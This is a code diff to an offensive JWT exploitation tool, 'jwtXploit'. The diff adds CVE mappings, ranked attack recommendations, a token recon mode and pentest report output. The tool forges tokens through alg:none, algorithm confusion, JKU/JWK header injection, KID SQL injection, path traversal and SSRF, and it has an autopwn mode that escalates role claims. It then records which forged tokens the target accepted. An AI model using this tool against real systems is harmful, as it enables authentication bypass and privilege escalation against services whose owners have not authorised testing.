@@ -10,6 +10,7 @@ import sys
 import subprocess
 import re
 import time
+import datetime
 import threading
 import socket
 import http.server
@@ -33,6 +34,9 @@ CONFIG = {
     "escalate_role":  None,   # --escalate-role: auto-set privilege claims to this value
     "strip_exp":      False,  # --strip-exp: remove nbf/iat and extend exp before signing
     "use_hashcat":    False,  # --hashcat: use GPU hashcat instead of Python threaded BF
+    "output_file":    None,   # -o: path to save the report
+    "output_format":  "json", # --format: json | txt | md
+    "findings":       [],     # accumulated findings for the report
 }
 
 
@@ -187,6 +191,248 @@ def start_jwks_server(jwks_data, port=8888):
     t.start()
     return server
 
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 4 — CVE MAP, RECOMMENDER, DECODE MODE, REPORTING
+# ──────────────────────────────────────────────────────────────
+
+# Map internal attack keys → (CVE, CVSS, short description)
+CVE_MAP = {
+    "unverified":     ("CVE-2015-9235",  "9.8", "Signature not verified — library accepts tampered tokens"),
+    "alg_none":       ("CVE-2015-9235",  "9.8", "alg:none accepted — no signature required"),
+    "algo_confusion": ("CVE-2016-5431",  "9.1", "RS256 → HS256 algorithm confusion attack"),
+    "jwk_inject":     ("CVE-2018-0114",  "9.8", "JWK self-signed header injection"),
+    "jku_inject":     ("CVE-2018-0114",  "9.8", "JKU header injection — attacker-hosted key set"),
+    "psychic_sig":    ("CVE-2022-21449", "9.8", "Java ECDSA Psychic Signature — zero-value r/s bypass"),
+    "kid_traversal":  ("N/A",            "8.2", "KID path traversal — empty key via /dev/null"),
+    "kid_sqli":       ("N/A",            "9.1", "KID SQL injection — UNION SELECT controls signing key"),
+    "kid_ssrf":       ("N/A",            "8.6", "KID SSRF — server fetches key from attacker-controlled URL"),
+    "null_sig":       ("N/A",            "7.5", "Null/stripped signature accepted by JWT library"),
+    "weak_key":       ("N/A",            "8.8", "Weak or guessable HMAC signing secret"),
+}
+
+# Maps attack name substrings → CVE_MAP keys (for print_result lookup)
+_ATTACK_CVE_KEYS = {
+    "unverified signature":   "unverified",
+    "alg:none":               "alg_none",
+    "alg:":                   "alg_none",
+    "algorithm confusion":    "algo_confusion",
+    "jwk header":             "jwk_inject",
+    "jku header":             "jku_inject",
+    "psychic signature":      "psychic_sig",
+    "kid path traversal":     "kid_traversal",
+    "kid sqli":               "kid_sqli",
+    "kid sql":                "kid_sqli",
+    "kid ssrf":               "kid_ssrf",
+    "null signature":         "null_sig",
+    "weak signing":           "weak_key",
+}
+
+
+def _cve_for_attack(attack_name):
+    """Return (cve_id, cvss, desc) for a given attack name string, or None."""
+    name_lower = attack_name.lower()
+    for substr, cve_key in _ATTACK_CVE_KEYS.items():
+        if substr in name_lower:
+            return CVE_MAP.get(cve_key)
+    return None
+
+
+def recommend_attacks(header, payload):
+    """Analyse the token header/payload and print ranked attack suggestions."""
+    alg  = header.get("alg", "").upper()
+    tips = []
+
+    if alg in ("RS256", "RS384", "RS512", "PS256", "PS384", "PS512"):
+        tips.append(("CRITICAL", "→ #7  Algorithm Confusion  (RS/PS alg detected — try public key as HMAC secret)"))
+    if alg in ("ES256", "ES384", "ES512"):
+        tips.append(("CRITICAL", "→ #8  ES256 Psychic Signature  (CVE-2022-21449 — zero r/s bypass)"))
+        tips.append(("HIGH",     "→ #7  Algorithm Confusion  (EC alg — worth trying)"))
+    if "jku" in header:
+        tips.append(("CRITICAL", "→ #5  JKU Injection  (jku header present — replace with your JWKS server)"))
+    if "jwk" in header:
+        tips.append(("CRITICAL", "→ #4  JWK Injection  (embedded JWK — replace with attacker key)"))
+    if "kid" in header:
+        tips.append(("HIGH",     "→ #6  KID Path Traversal  (kid header present)"))
+        tips.append(("HIGH",     "→ #10 KID SQL Injection  (if kid queries a database)"))
+        tips.append(("HIGH",     "→ #11 KID SSRF  (if kid is fetched as a URL)"))
+    if alg in ("HS256", "HS384", "HS512"):
+        tips.append(("HIGH",     "→ #3  Weak Key Brute Force  (HMAC — try rockyou / jwt-secrets wordlist)"))
+    tips.append(("MEDIUM",   "→ #2  alg:none  (7 case variants — always worth a shot)"))
+    tips.append(("MEDIUM",   "→ #9  Null Signature  (some libs skip sig check entirely)"))
+    tips.append(("LOW",      "→ #1  Unverified Signature  (swap payload, keep original sig)"))
+
+    exp = payload.get("exp")
+    if exp and exp < int(time.time()):
+        tips.append(("INFO",   "Token is expired — add --strip-exp to extend before attacking"))
+    if not exp:
+        tips.append(("INFO",   "No exp claim — replay freely, no time restriction"))
+
+    sev_color = {"CRITICAL": Fore.RED, "HIGH": Fore.YELLOW,
+                 "MEDIUM": Fore.CYAN,  "LOW": Fore.WHITE, "INFO": Fore.GREEN}
+
+    print(Fore.CYAN + "\n  ⚡ RECOMMENDED ATTACKS (ranked by likelihood):")
+    for sev, msg in tips:
+        print(sev_color.get(sev, Fore.WHITE) + f"    [{sev:8}]  {msg}")
+
+
+def decode_mode(token):
+    """--decode: full recon of a JWT without attacking anything."""
+    header  = get_header(token)
+    payload = decode_token(token)
+    now     = int(time.time())
+
+    print(Fore.CYAN + "\n" + "═" * 62)
+    print(Fore.CYAN + "  🔍  TOKEN RECON")
+    print(Fore.CYAN + "═" * 62)
+
+    print(Fore.YELLOW + f"\n  ALGORITHM  : {header.get('alg', 'unknown')}")
+    print(Fore.YELLOW + f"  TYPE       : {header.get('typ', 'JWT')}")
+
+    if "kid" in header:
+        print(Fore.RED    + f"  KID        : {header['kid']}  ← potential SQLi / traversal / SSRF")
+    if "jku" in header:
+        print(Fore.RED    + f"  JKU        : {header['jku']}  ← JKU injection surface!")
+    if "jwk" in header:
+        print(Fore.RED    +  "  JWK        : embedded  ← JWK injection surface!")
+
+    exp = payload.get("exp")
+    if exp:
+        exp_dt = datetime.datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M:%S")
+        if exp < now:
+            diff = now - exp
+            h, m = divmod(diff // 60, 60)
+            print(Fore.RED   + f"  EXPIRY     : ⚠️  EXPIRED {h}h {m}m ago  ({exp_dt})")
+        else:
+            diff = exp - now
+            h, m = divmod(diff // 60, 60)
+            print(Fore.GREEN + f"  EXPIRY     : ✅ Valid — expires in {h}h {m}m  ({exp_dt})")
+    else:
+        print(Fore.RED   +  "  EXPIRY     : ⚠️  No exp claim — token never expires")
+
+    for claim_key in ("nbf", "iat"):
+        if claim_key in payload:
+            ts = datetime.datetime.fromtimestamp(payload[claim_key]).strftime("%Y-%m-%d %H:%M:%S")
+            label = "NOT BEFORE" if claim_key == "nbf" else "ISSUED AT "
+            print(Fore.YELLOW + f"  {label}  : {ts}")
+
+    interesting = {k: v for k, v in payload.items() if k not in ("exp", "nbf", "iat")}
+    if interesting:
+        print(Fore.YELLOW + "\n  CLAIMS:")
+        for k, v in interesting.items():
+            print(Fore.YELLOW + f"    {k:20} = {v}")
+
+    recommend_attacks(header, payload)
+    print(Fore.CYAN + "\n" + "═" * 62 + "\n")
+
+
+def save_report(output_file, fmt):
+    """Write accumulated findings to disk in json / txt / md format."""
+    findings = CONFIG.get("findings", [])
+    confirmed = [f for f in findings if f.get("verified")]
+
+    if not findings:
+        print(Fore.YELLOW + "[*] No findings to save (no attacks ran or no tokens generated).")
+        return
+
+    target = (CONFIG.get("original_token") or "unknown")[:30] + "..."
+    ts     = time.strftime("%Y-%m-%d %H:%M:%S")
+
+    # ── JSON ──────────────────────────────────────────────────
+    if fmt == "json":
+        data = {
+            "tool":      "jwtXploit",
+            "generated": ts,
+            "token_preview": target,
+            "stats": {
+                "total_generated": len(findings),
+                "confirmed_accepted": len(confirmed),
+            },
+            "findings": findings,
+        }
+        content = json.dumps(data, indent=4, default=str)
+
+    # ── TXT ───────────────────────────────────────────────────
+    elif fmt == "txt":
+        lines = [
+            "jwtXploit — Pentest Report",
+            f"Generated : {ts}",
+            f"Tokens    : {len(findings)} generated  |  {len(confirmed)} confirmed accepted",
+            "=" * 62,
+        ]
+        for i, f in enumerate(findings, 1):
+            status = "✅ ACCEPTED" if f.get("verified") else "   generated"
+            lines.append(f"\n[{i}] {f['attack']}  [{status}]")
+            lines.append(f"    Token   : {f['token'][:80]}...")
+            if f.get("verify_reason"):
+                lines.append(f"    Reason  : {f['verify_reason']}")
+            if f.get("delivery"):
+                lines.append(f"    Via     : {f['delivery']}")
+        content = "\n".join(lines)
+
+    # ── Markdown ──────────────────────────────────────────────
+    elif fmt == "md":
+        lines = [
+            "# JWT Vulnerability Report",
+            f"**Tool:** jwtXploit &nbsp;|&nbsp; **Date:** {ts}",
+            "",
+            "## Executive Summary",
+            f"| Metric | Value |",
+            f"|--------|-------|",
+            f"| Tokens Generated | {len(findings)} |",
+            f"| Confirmed Accepted | **{len(confirmed)}** |",
+            "",
+            "## Confirmed Findings",
+        ]
+        if confirmed:
+            for f in confirmed:
+                cve_info = _cve_for_attack(f["attack"])
+                cve_str  = f"{cve_info[0]} (CVSS {cve_info[1]}) — {cve_info[2]}" if cve_info else "N/A"
+                lines += [
+                    f"### {f['attack']}",
+                    f"| Field | Detail |",
+                    f"|-------|--------|",
+                    f"| CVE / Reference | `{cve_str}` |",
+                    f"| Accepted Via | {f.get('delivery', 'N/A')} |",
+                    f"| Detection Reason | {f.get('verify_reason', 'N/A')} |",
+                    "",
+                    "**Forged Token:**",
+                    f"```\n{f['token']}\n```",
+                    "",
+                    "**Modified Payload:**",
+                    f"```json\n{json.dumps(f.get('payload', {}), indent=2)}\n```",
+                    "",
+                    "**Remediation:** Validate the JWT signature server-side with a "
+                    "well-maintained library. Enforce a strict algorithm allowlist "
+                    "and never trust header-supplied keys.",
+                    "",
+                ]
+        else:
+            lines.append("_No tokens were confirmed accepted during this scan._")
+
+        lines += [
+            "",
+            "## All Generated Tokens",
+            "| # | Attack | Status |",
+            "|---|--------|--------|",
+        ]
+        for i, f in enumerate(findings, 1):
+            status = "✅ Accepted" if f.get("verified") else "⚪ Generated"
+            lines.append(f"| {i} | {f['attack']} | {status} |")
+
+        content = "\n".join(lines)
+    else:
+        print(Fore.RED + f"[!] Unknown format '{fmt}' — use json, txt, or md.")
+        return
+
+    try:
+        with open(output_file, "w", encoding="utf-8") as fp:
+            fp.write(content)
+        print(Fore.GREEN + f"\n[+] 📄 Report saved → {output_file}  (format: {fmt})")
+        print(Fore.GREEN + f"[+] {len(findings)} tokens generated  |  {len(confirmed)} confirmed accepted")
+    except Exception as e:
+        print(Fore.RED + f"[!] Could not save report: {e}")
+
 def interactive_edit_dict(title, d):
     # AUTOPWN MODE — skip all interaction; optionally escalate role-related claims
     if CONFIG.get("autopwn"):
@@ -294,12 +540,32 @@ def interactive_edit_dict(title, d):
 
 def print_result(attack_name, token, payload, header):
     print(Fore.CYAN + f"\n[+] {attack_name}")
-    print(Fore.GREEN + "[*] Modified JWT Token:")
-    print(Fore.GREEN + token)
+
+    # Show CVE reference if one exists for this attack
+    cve = _cve_for_attack(attack_name)
+    if cve:
+        cve_id, cvss, desc = cve
+        clr = Fore.RED if cve_id != "N/A" else Fore.YELLOW
+        print(clr + f"    ↳ {cve_id}  CVSS:{cvss}  {desc}")
+
+    print(Fore.GREEN  + "[*] Modified JWT Token:")
+    print(Fore.GREEN  + token)
     print(Fore.YELLOW + "[*] Decoded Header:")
     print(Fore.YELLOW + json.dumps(header, indent=4))
     print(Fore.YELLOW + "[*] Modified Payload:")
     print(Fore.YELLOW + json.dumps(payload, indent=4))
+
+    # Record every generated token for reporting
+    CONFIG["findings"].append({
+        "attack":    attack_name,
+        "token":     token,
+        "payload":   payload,
+        "header":    header,
+        "verified":  False,
+        "verify_reason": None,
+        "delivery":  None,
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+    })
 
 def check_url(token, url=None):
     if not url:
@@ -405,6 +671,10 @@ def check_url(token, url=None):
             print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED!  Reason: {reason}")
             print_response_details(resp)
             print(Fore.GREEN + Style.BRIGHT + f"\n[*] Accepted JWT:\n{token}")
+            if CONFIG["findings"]:
+                CONFIG["findings"][-1]["verified"]      = True
+                CONFIG["findings"][-1]["verify_reason"] = reason
+                CONFIG["findings"][-1]["delivery"]      = "Authorization: Bearer"
             return
     except Exception as e:
         print(Fore.RED + f"[!] Request error (Bearer header): {e}")
@@ -420,6 +690,10 @@ def check_url(token, url=None):
                 print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED via cookie '{cookie_name}'!  Reason: {reason}")
                 print_response_details(resp)
                 print(Fore.GREEN + Style.BRIGHT + f"\n[*] Accepted JWT:\n{token}")
+                if CONFIG["findings"]:
+                    CONFIG["findings"][-1]["verified"]      = True
+                    CONFIG["findings"][-1]["verify_reason"] = reason
+                    CONFIG["findings"][-1]["delivery"]      = f"Cookie: {cookie_name}"
                 return
         except Exception as e:
             print(Fore.RED + f"[!] Request error (cookie '{cookie_name}'): {e}")
@@ -1168,6 +1442,9 @@ def main():
     parser.add_argument("--escalate-role",    metavar="ROLE", help="In autopwn mode, auto-set role/admin/sub claims to this value (e.g. admin)")
     parser.add_argument("--strip-exp",        action="store_true", help="Remove nbf/iat and push exp 10 years forward before signing every token")
     parser.add_argument("--hashcat",          action="store_true", help="Use GPU hashcat for brute force instead of Python threaded mode")
+    parser.add_argument("--decode",           action="store_true", help="Decode and analyse the token without attacking (recon mode)")
+    parser.add_argument("-o", "--output",     metavar="FILE", help="Save report to this file after the session")
+    parser.add_argument("--format",           choices=["json", "txt", "md"], default="json", metavar="FMT", help="Report format: json (default), txt, or md")
     args = parser.parse_args()
 
     # Populate global config from parsed args
@@ -1179,19 +1456,34 @@ def main():
     CONFIG["escalate_role"]  = args.escalate_role
     CONFIG["strip_exp"]      = args.strip_exp
     CONFIG["use_hashcat"]    = args.hashcat
+    CONFIG["output_file"]    = args.output
+    CONFIG["output_format"]  = args.format
 
     # Always scan payload for embedded secrets on load
     scan_token_secrets(args.token)
 
+    # --decode mode: full recon, then exit
+    if args.decode:
+        decode_mode(args.token)
+        return
+
+    # Print attack recommendations based on token header (quick, always shown)
+    header  = get_header(args.token)
+    payload = decode_token(args.token)
+    recommend_attacks(header, payload)
+    print()
+
     # Autopwn mode — skip menu, run everything automatically
     if args.autopwn:
         run_autopwn(args.token, args.url, wordlist=args.wordlist)
+        if CONFIG["output_file"]:
+            save_report(CONFIG["output_file"], CONFIG["output_format"])
         return
 
     attacks = {
-        "1": ("Unverified Signature",                            attack_unverified_signature),
-        "2": ("Flawed Signature Verification (alg:none)",        attack_flawed_verification),
-        "3": ("Weak Signing Key Brute Force",                    lambda t, u: attack_weak_signing_key(t, args.wordlist, u)),
+        "1":  ("Unverified Signature",                            attack_unverified_signature),
+        "2":  ("Flawed Signature Verification (alg:none)",        attack_flawed_verification),
+        "3":  ("Weak Signing Key Brute Force",                    lambda t, u: attack_weak_signing_key(t, args.wordlist, u)),
         "4":  ("JWK Header Injection",                            attack_jwk_header_injection),
         "5":  ("JKU Header Injection (auto-hosted JWKS)",         attack_jku_header_injection),
         "6":  ("KID Header Path Traversal",                       attack_kid_traversal),
@@ -1204,13 +1496,16 @@ def main():
 
     print(Fore.CYAN + "[*] Choose an attack method:")
     for k, v in attacks.items():
-        print(Fore.CYAN + f"{k}. {v[0]}")
-    choice = input(Fore.YELLOW + "[?] Enter choice: ").strip()
+        print(Fore.CYAN + f"  {k:>2}. {v[0]}")
+    choice = input(Fore.YELLOW + "\n[?] Enter choice: ").strip()
 
     if choice in attacks:
         attacks[choice][1](args.token, args.url)
     else:
         print(Fore.RED + "[-] Invalid choice")
+
+    if CONFIG["output_file"]:
+        save_report(CONFIG["output_file"], CONFIG["output_format"])
 
 if __name__ == "__main__":
     main()
